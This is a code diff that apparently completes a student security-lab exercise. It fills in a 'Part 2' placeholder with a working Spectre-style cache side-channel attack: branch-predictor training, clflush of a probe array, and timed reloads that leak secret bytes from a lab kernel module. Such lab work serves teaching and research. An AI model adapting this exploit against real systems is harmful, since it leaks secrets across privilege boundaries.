@@ -11,6 +11,10 @@
 #include "labspectre.h"
 #include "labspectreipc.h"
 
+#define THRESHOLD 180
+#define ATTEMPTS 100
+#define TRAIN_TIMES 30
+
 /*
  * call_kernel_part2
  * Performs the COMMAND_PART2 call in the kernel
@@ -37,7 +41,7 @@ static inline void call_kernel_part2(int kernel_fd, char *shared_memory, size_t 
  *  - shared_memory: A pointer to a region of memory shared with the kernel
  */
 int run_attacker(int kernel_fd, char *shared_memory) {
-    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
+    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN] = {0};
     size_t current_offset = 0;
 
     printf("Launching attacker\n");
@@ -45,8 +49,37 @@ int run_attacker(int kernel_fd, char *shared_memory) {
     for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
         char leaked_byte;
 
-        // [Part 2]- Fill this in!
-        // leaked_byte = ??
+        int candidates[256] = {0};
+
+        for (int attempt = 0; attempt < ATTEMPTS; attempt++) {
+
+            for (int t = 0; t < TRAIN_TIMES; t++) {
+                call_kernel_part2(kernel_fd, shared_memory, t % 4);
+            }
+
+            for (int i = 0; i < 256; i++) {
+                clflush(&shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE]);
+            }
+
+            call_kernel_part2(kernel_fd, shared_memory, current_offset);
+
+            for (int i = 0; i < 256; i++) {
+                int mix_i = ((i * 167) + 13) & 255;
+                char *addr = &shared_memory[mix_i * SHD_SPECTRE_LAB_PAGE_SIZE];
+                uint64_t dt = time_access(addr);
+
+                if (dt < THRESHOLD) {
+                    candidates[mix_i]++;
+                }
+            }
+        }
+
+        int best = 0;
+        for (int i = 1; i < 256; i++) {
+            if (candidates[i] > candidates[best]) best = i;
+        }
+
+        leaked_byte = (char)best;
 
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
